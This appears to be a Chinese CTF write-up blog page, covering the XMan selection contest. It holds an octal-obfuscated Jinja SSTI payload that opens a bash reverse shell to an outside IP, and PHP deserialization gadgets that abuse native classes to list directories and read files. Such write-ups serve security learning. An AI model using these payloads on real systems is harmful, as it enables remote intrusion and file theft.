@@ -1,0 +1,197 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>第五届XMan选拔赛 | Rossweisse</title><meta name="keywords" content="CTF"><meta name="author" content="Rossweisse"><meta name="copyright" content="Rossweisse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="签到基础题   flag{you_are_great!!!}  easysstissti弹shellssti，主要考点是如何闭合。 测试发现&amp;#123;%print(1)%&amp;#125;成功返回。  __globals__查看当前位置的全部模块，方法和全局变量。  name&#x3D;%7B%25print((lipsum|attr(“__globals__“)))%25%7D  values()查找可利用模">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第五届XMan选拔赛">
+<meta property="og:url" content="https://lucifer-rossweisse.github.io/2021/08/07/WriteUp/%E7%AC%AC%E4%BA%94%E5%B1%8AXMan%E9%80%89%E6%8B%94%E8%B5%9B/index.html">
+<meta property="og:site_name" content="Rossweisse">
+<meta property="og:description" content="签到基础题   flag{you_are_great!!!}  easysstissti弹shellssti，主要考点是如何闭合。 测试发现&amp;#123;%print(1)%&amp;#125;成功返回。  __globals__查看当前位置的全部模块，方法和全局变量。  name&#x3D;%7B%25print((lipsum|attr(“__globals__“)))%25%7D  values()查找可利用模">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lucifer-rossweisse.github.io/img/3.jpg">
+<meta property="article:published_time" content="2021-08-07T11:28:59.000Z">
+<meta property="article:modified_time" content="2021-08-07T11:30:27.138Z">
+<meta property="article:author" content="Rossweisse">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lucifer-rossweisse.github.io/img/3.jpg"><link rel="shortcut icon" href="/img/website.jpg"><link rel="canonical" href="https://lucifer-rossweisse.github.io/2021/08/07/WriteUp/%E7%AC%AC%E4%BA%94%E5%B1%8AXMan%E9%80%89%E6%8B%94%E8%B5%9B/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-center"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-08-07 19:30:27'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/id.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/3.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Rossweisse</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">第五届XMan选拔赛</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-08-07T11:28:59.000Z" title="发表于 2021-08-07 19:28:59">2021-08-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-07T11:30:27.138Z" title="更新于 2021-08-07 19:30:27">2021-08-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WriteUp/">WriteUp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">515</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>基础题</p>
+<p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806120716307.png"></p>
+<blockquote>
+<p>flag{you_are_great!!!}</p>
+</blockquote>
+<h2 id="easyssti"><a href="#easyssti" class="headerlink" title="easyssti"></a>easyssti</h2><h3 id="ssti弹shell"><a href="#ssti弹shell" class="headerlink" title="ssti弹shell"></a>ssti弹shell</h3><p>ssti，主要考点是如何闭合。</p>
+<p>测试发现<code>&#123;%print(1)%&#125;</code>成功返回。</p>
+<p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806120923584.png"></p>
+<p>__globals__查看当前位置的全部模块，方法和全局变量。</p>
+<blockquote>
+<p>name=%7B%25print((lipsum|attr(“__globals__“)))%25%7D</p>
+</blockquote>
+<p>values()查找可利用模块。</p>
+<blockquote>
+<p>name=%7B%25print((lipsum|attr(“__globals__“)).values()[18].values()[134])%25%7D</p>
+</blockquote>
+<p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806121618333.png"></p>
+<p>利用eval弹shell，使用八进制绕过。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=%7B%25print((lipsum|attr(<span class="string">&quot;__globals__&quot;</span>)).values()[<span class="number">18</span>].values()[<span class="number">134</span>](<span class="string">&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\142\141\163\150\40\55\143\40\42\142\141\163\150\40\55\151\40\76\46\40\57\144\145\166\57\164\143\160\57\61\61\66\56\66\62\56\62\64\63\56\62\63\61\57\61\62\63\64\40\60\76\46\61\42\47\51\56\162\141\145\144\50\51&quot;</span>))%<span class="number">25</span>%7D</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806130713332.png"></p>
+<p>拿到flag</p>
+<blockquote>
+<p>flag{zPkb3tzUW8m0KuSfPoPqgSU37I4ui2hZ}</p>
+</blockquote>
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><p>题目直接给出源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;Hel&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;xctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> Filter;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;what?Really?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hel</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;Hello bro, I guess you are a lazy &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> XMAN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看出来是php反序列化题。</p>
+<p>可利用点只有<code>echo new  $this-&gt;class ($this-&gt;para);</code>。</p>
+<p>应该是利用php原生类进行文件读取。</p>
+<p>利用FilessystemIterator类查看目录文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;FilesystemIterator&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;./&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> XMAN();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806122559447.png"></p>
+<p>拿到了flag文件名。</p>
+<p>利用SplFileObject原生类查看文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;./xxxXXXmMManNNn/f1a4.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> XMAN();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210806122723103.png"></p>
+<p>拿到flag。</p>
+<blockquote>
+<p>flag{928erf51ab894a64f7865cf3c2128b34}</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Rossweisse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://lucifer-rossweisse.github.io/2021/08/07/WriteUp/%E7%AC%AC%E4%BA%94%E5%B1%8AXMan%E9%80%89%E6%8B%94%E8%B5%9B/">https://lucifer-rossweisse.github.io/2021/08/07/WriteUp/%E7%AC%AC%E4%BA%94%E5%B1%8AXMan%E9%80%89%E6%8B%94%E8%B5%9B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://lucifer-rossweisse.github.io" target="_blank">Rossweisse</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="/img/3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/08/03/WriteUp/CyBRICS2021/"><img class="next-cover" src="/img/5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CyBRICS2021部分WriteUp</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/08/03/WriteUp/CyBRICS2021/" title="CyBRICS2021部分WriteUp"><img class="cover" src="/img/5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-03</div><div class="title">CyBRICS2021部分WriteUp</div></div></a></div><div><a href="/2021/03/24/WriteUp/nep2021/" title="nep2021部分WriteUp"><img class="cover" src="/img/4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-24</div><div class="title">nep2021部分WriteUp</div></div></a></div><div><a href="/2021/05/20/WriteUp/CISCN2021部分WriteUp/" title="CISCN2021部分WriteUp"><img class="cover" src="/img/5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-20</div><div class="title">CISCN2021部分WriteUp</div></div></a></div><div><a href="/2021/03/26/web学习/SSTI小总结/" title="SSTI小总结"><img class="cover" src="/img/5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-26</div><div class="title">SSTI小总结</div></div></a></div><div><a href="/2021/03/29/web学习/命令注入小总结/" title="命令注入小总结"><img class="cover" src="/img/4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-29</div><div class="title">命令注入小总结</div></div></a></div><div><a href="/2021/03/11/WriteUp/BUUOJ web 1pts/" title="BUUOJ-Web-1pts"><img class="cover" src="/img/4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-11</div><div class="title">BUUOJ-Web-1pts</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/id.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Rossweisse</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lucifer-rossweisse"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来到南桐山庄</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyssti"><span class="toc-number">2.</span> <span class="toc-text">easyssti</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssti%E5%BC%B9shell"><span class="toc-number">2.1.</span> <span class="toc-text">ssti弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyphp"><span class="toc-number">3.</span> <span class="toc-text">easyphp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.1.</span> <span class="toc-text">php反序列化</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/07/WriteUp/%E7%AC%AC%E4%BA%94%E5%B1%8AXMan%E9%80%89%E6%8B%94%E8%B5%9B/" title="第五届XMan选拔赛"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第五届XMan选拔赛"/></a><div class="content"><a class="title" href="/2021/08/07/WriteUp/%E7%AC%AC%E4%BA%94%E5%B1%8AXMan%E9%80%89%E6%8B%94%E8%B5%9B/" title="第五届XMan选拔赛">第五届XMan选拔赛</a><time datetime="2021-08-07T11:28:59.000Z" title="发表于 2021-08-07 19:28:59">2021-08-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/03/WriteUp/CyBRICS2021/" title="CyBRICS2021部分WriteUp"><img src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CyBRICS2021部分WriteUp"/></a><div class="content"><a class="title" href="/2021/08/03/WriteUp/CyBRICS2021/" title="CyBRICS2021部分WriteUp">CyBRICS2021部分WriteUp</a><time datetime="2021-08-03T09:21:27.000Z" title="发表于 2021-08-03 17:21:27">2021-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/23/web%E5%AD%A6%E4%B9%A0/PHP%E7%89%B9%E6%80%A7/" title="PHP特性"><img src="/img/7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP特性"/></a><div class="content"><a class="title" href="/2021/07/23/web%E5%AD%A6%E4%B9%A0/PHP%E7%89%B9%E6%80%A7/" title="PHP特性">PHP特性</a><time datetime="2021-07-23T02:56:00.000Z" title="发表于 2021-07-23 10:56:00">2021-07-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/20/WriteUp/CISCN2021%E9%83%A8%E5%88%86WriteUp/" title="CISCN2021部分WriteUp"><img src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CISCN2021部分WriteUp"/></a><div class="content"><a class="title" href="/2021/05/20/WriteUp/CISCN2021%E9%83%A8%E5%88%86WriteUp/" title="CISCN2021部分WriteUp">CISCN2021部分WriteUp</a><time datetime="2021-05-20T12:39:51.000Z" title="发表于 2021-05-20 20:39:51">2021-05-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/29/web%E5%AD%A6%E4%B9%A0/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%B0%8F%E6%80%BB%E7%BB%93/" title="命令注入小总结"><img src="/img/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="命令注入小总结"/></a><div class="content"><a class="title" href="/2021/03/29/web%E5%AD%A6%E4%B9%A0/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%B0%8F%E6%80%BB%E7%BB%93/" title="命令注入小总结">命令注入小总结</a><time datetime="2021-03-29T04:56:01.000Z" title="发表于 2021-03-29 12:56:01">2021-03-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Rossweisse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 